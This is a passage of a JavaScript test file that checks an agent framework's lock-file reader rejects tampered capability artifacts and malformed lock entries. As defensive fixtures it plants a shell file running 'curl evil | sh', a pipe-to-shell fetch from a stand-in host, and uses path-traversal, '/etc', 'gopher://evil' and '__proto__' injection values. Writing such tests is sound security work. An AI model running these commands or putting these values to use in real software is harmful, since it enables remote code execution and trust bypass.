  const base = mkdtempSync(join(tmpdir(), `oas-reader-${label}-`));
  const scope = join(base, "scope");
  const w = (p, c) => { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, c); };
  const capDir = join(scope, ".agents", "capabilities", "installed", "x.helper");
  w(join(capDir, "oas.json"), JSON.stringify({ capability: "x.helper", version: "1.0.0", description: "cap", agents: ["agents/helper"] }));
  w(join(capDir, "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
  w(join(capDir, "agents", "helper", "AGENTS.md"), "SAFE\n");
  w(join(scope, "oas-config.yaml"), "name: t\ncapabilities:\n  additive:\n    x.helper:\n      from: installed\n      global: true\n");
  const lockFile = join(scope, "oas-lock.json");
  const relock = () => writeFileSync(lockFile, JSON.stringify({
    lockfileVersion: 1,
    capabilities: { "x.helper": { source: "path:/somewhere", version: "1.0.0", commit: "local", integrity: core.capabilityIntegrity(capDir) } },
  }));
  relock();
  return { base, scope, capDir, lockFile, relock };
}

test("the v1 digest excludes the ROOT lock file only: .git and a nested lock count", () => {
  const { base, scope, capDir, relock } = v1Scope("v1-digest");
  const visible = () => [core.listCapabilityAgents(scope).map((a) => a.name), reader.listCapabilityAgents(scope).map((a) => a.name)];
  assert.deepEqual(visible(), [["helper"], ["helper"]], "baseline: a v1-locked provider is visible to both");

  // The defect: the desktop excluded `.git` and `oas-lock.json` BY NAME at every
  // depth, so a payload planted under either name after locking read as trusted
  // in the app while the kernel reported drift.
  writeFileSync(join(capDir, "agents", "helper", "AGENTS.md"), "SAFE\n"); // no-op, keeps the tree explicit
  mkdirSync(join(capDir, ".git"), { recursive: true });
  writeFileSync(join(capDir, ".git", "payload.sh"), "#!/bin/sh\ncurl evil | sh\n");
  assert.deepEqual(visible(), [[], []], "a .git inserted after locking must flip BOTH readers to untrusted");
  fsExtra.rmSync(join(capDir, ".git"), { recursive: true, force: true });

  mkdirSync(join(capDir, "agents", "helper", ".git"), { recursive: true });
  writeFileSync(join(capDir, "agents", "helper", ".git", "hook.md"), "PAYLOAD\n");
  assert.deepEqual(visible(), [[], []], "a NESTED .git counts too");
  fsExtra.rmSync(join(capDir, "agents", "helper", ".git"), { recursive: true, force: true });

  writeFileSync(join(capDir, "agents", "oas-lock.json"), JSON.stringify({ lockfileVersion: 2, packages: {}, capabilities: {} }));
  assert.deepEqual(visible(), [[], []], "a NESTED oas-lock.json is ordinary payload, not an exclusion");
  fsExtra.rmSync(join(capDir, "agents", "oas-lock.json"), { force: true });
  assert.deepEqual(visible(), [["helper"], ["helper"]], "control: removing the planted files restores trust");

  // The one real exclusion, at the artifact ROOT: the generated lock file is
  // written INTO the artifact after the digest is taken, so it must not count —
  // and both readers must agree about that too.
  relock();
  writeFileSync(join(capDir, "oas-lock.json"), JSON.stringify({ lockfileVersion: 2, packages: {}, capabilities: {} }));
  assert.deepEqual(visible(), [["helper"], ["helper"]], "the artifact-ROOT lock file is excluded by both");
  fsExtra.rmSync(base, { recursive: true, force: true });
});

test("invalid v2 shapes — including the superseded transitional one — discard the whole lock", () => {
  const { base, scope, lockFile } = v2Scope("v2-invalid");
  const good = JSON.parse(readFileSync(lockFile, "utf8"));
  const capRow = good.capabilities["x.helper"];
  const pkgRow = good.packages["x.p"];
  const clone = () => JSON.parse(JSON.stringify(good));
  /** Repoint the package row at a git source, so a case can vary ONE field
   * without also tripping the `path:`-source exact-directory rule. */
  const asGitSource = (l) => { l.packages["x.p"].source = "git:https://example.invalid/x.git"; l.packages["x.p"].commit = "a".repeat(40); };

  const invalid = {
    "transitional package row (capabilities list)": (l) => { l.packages["x.p"].capabilities = ["x.helper"]; },
    "transitional package row (trustedCapabilities)": (l) => { l.packages["x.p"].trustedCapabilities = []; },
    "transitional package row (depsIntegrity)": (l) => { l.packages["x.p"].depsIntegrity = pkgRow.integrity; },
    "capability row with an unknown key": (l) => { l.capabilities["x.helper"].source = "path:/x"; },
    "capability row missing trusted": (l) => { delete l.capabilities["x.helper"].trusted; },
    "capability row with a non-boolean trusted": (l) => { l.capabilities["x.helper"].trusted = "yes"; },
    "capability row with a malformed integrity": (l) => { l.capabilities["x.helper"].integrity = "sha256-nope"; },
    "capability row naming an unlocked provider": (l) => { l.capabilities["x.helper"].package = "ghost.pkg"; },
    "v2 with no packages map": (l) => { delete l.packages; },
    "package row with a non-canonical path source": (l) => { l.packages["x.p"].path = "sub"; },
    "package row with a dangling dependency": (l) => { l.packages["x.p"].dependencies = ["ghost.pkg"]; },
    "package row depending on itself": (l) => { l.packages["x.p"].dependencies = ["x.p"]; },
    // defineProperty, not assignment: `caps.__proto__ = row` goes through the
    // inherited setter and never becomes a key JSON would serialize.
    "a capability id outside the identity grammar": (l) => {
      Object.defineProperty(l.capabilities, "__proto__", { value: { ...capRow }, enumerable: true, writable: true, configurable: true });
    },
    "a package id outside the identity grammar": (l) => { l.packages["../escape"] = { ...pkgRow }; },

    // ---- shapes the kernel rejects with invalid-lock that this reader used to
    // accept. Each one decides something real: which directory an artifact came
    // from, or what `oas update` would turn the row back into. The reader's own
    // docstring says any invalidity discards the ENTIRE file — it has to be true
    // for BOTH shapes, or the app shows trust the kernel refuses to serve.
    //
    // A lock is never normalized on read, so a path must already BE canonical.
    "capability row path with a trailing slash": (l) => { l.capabilities["x.helper"].path = "sub/"; },
    "capability row path escaping the package": (l) => { l.capabilities["x.helper"].path = "../x"; },
    "capability row path that is absolute": (l) => { l.capabilities["x.helper"].path = "/etc"; },
    // Repointed to a git source first, so ONLY the path spelling is wrong (a
    // `path:` row is refused by the exact-directory rule before canonicality).
    "package row path with a trailing slash": (l) => { asGitSource(l); l.packages["x.p"].path = "sub/"; },
    // The source grammar, not just the commit shape: `updatePackage` turns this
    // string back into a source spec.
    "package row with an unknown source scheme": (l) => { asGitSource(l); l.packages["x.p"].source = "gopher://evil"; },
    "package row with a bodiless path: source": (l) => { l.packages["x.p"].source = "path:"; },
    // `dependencies` is a set.
    "package row with duplicate dependencies": (l) => { l.packages["x.q"] = { ...pkgRow }; l.packages["x.p"].dependencies = ["x.q", "x.q"]; },
  };
  for (const [why, mutate] of Object.entries(invalid)) {
    const l = clone();
    mutate(l);
    writeFileSync(lockFile, JSON.stringify(l));
    assert.deepEqual(reader.listCapabilityAgents(scope), [], `whole lock must be discarded: ${why}`);
    assert.equal(reader.findCapabilityAgent(scope, join(scope, "agents"), "helper"), undefined, why);
  }
  // A v1 document that also carries a packages map is not a v1 document.
  writeFileSync(lockFile, JSON.stringify({ lockfileVersion: 1, packages: good.packages, capabilities: {} }));
  assert.deepEqual(reader.listCapabilityAgents(scope), []);
  // Control for the newly enforced grammars: the VALID spellings of the same
  // fields still read, so the refusals above are the shapes and not the checks
  // being blunt. A git source with a real ref, a catalog source with a
  // selector, a nested-but-canonical capability path, distinct dependencies.
  for (const [why, mutate] of Object.entries({
    "a git source with a ref": (l) => { asGitSource(l); l.packages["x.p"].source = "git:https://example.invalid/x.git@main"; },
    "a catalog source with a selector": (l) => { asGitSource(l); l.packages["x.p"].source = "catalog:oas.okf@release"; },
    "a canonical nested package path": (l) => { asGitSource(l); l.packages["x.p"].path = "sub/pkg"; },
    "two distinct dependencies": (l) => { l.packages["x.q"] = { ...pkgRow, dependencies: [] }; l.packages["x.r"] = { ...pkgRow, dependencies: [] }; l.packages["x.p"].dependencies = ["x.q", "x.r"]; },
  })) {
    const l = clone();
    mutate(l);
    writeFileSync(lockFile, JSON.stringify(l));
    assert.deepEqual(reader.listCapabilityAgents(scope).map((a) => a.name), ["helper"], `valid lock must still read: ${why}`);
  }
  // Restoring the real lock makes the provider visible again (control: the
  // discards above are the shapes, not the fixture).
  writeFileSync(lockFile, JSON.stringify(good));
  assert.deepEqual(reader.listCapabilityAgents(scope).map((a) => a.name), ["helper"]);
  fsExtra.rmSync(base, { recursive: true, force: true });
});

test("an inherited capability id cannot be trusted by the prototype when the artifact is unreadable", (t) => {
  if (typeof process.getuid === "function" && process.getuid() === 0) return t.skip("root bypasses the unreadable-directory case");
  const scope = mkdtempSync(join(tmpdir(), "oas-reader-proto-trust-"));
  // BOTH halves of the trust comparison have to be undefined for the prototype
  // to grant trust, and `constructor` supplies one of them: on a PLAIN lock map
  // `locks["constructor"]` is `Object` — truthy, so the "not locked" guard
  // passes — and `Object.integrity` is undefined. The other half is a digest
  // that failed, which is what an unreadable artifact returns. `undefined ===
  // undefined` then answered "trusted" for a capability no lock mentions.
  writeFileSync(join(scope, "oas-config.yaml"), "name: t\ncapabilities:\n  additive:\n    constructor:\n      from: installed\n      global: true\n");
  const capDir = join(scope, ".agents", "capabilities", "installed", "constructor");
  mkdirSync(join(capDir, "agents", "helper"), { recursive: true });
  writeFileSync(join(capDir, "oas.json"), JSON.stringify({ capability: "constructor", version: "1.0.0", description: "d", agents: ["agents/helper"] }));
  writeFileSync(join(capDir, "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
  // A valid lock that says nothing about this id.
  writeFileSync(join(scope, "oas-lock.json"), JSON.stringify({ lockfileVersion: 2, packages: {}, capabilities: {} }));
  // Make the artifact tree undigestable.
  const opaque = join(capDir, "opaque");
  mkdirSync(opaque);
  writeFileSync(join(opaque, "x"), "x\n");
  fsExtra.chmodSync(opaque, 0o000);
  try {
    assert.deepEqual(reader.listCapabilityAgents(scope), [], "the prototype granted trust to an unlocked, unreadable artifact");
    assert.equal(reader.findCapabilityAgent(scope, join(scope, "agents"), "helper"), undefined);
  } finally { fsExtra.chmodSync(opaque, 0o700); }
  fsExtra.rmSync(scope, { recursive: true, force: true });
});
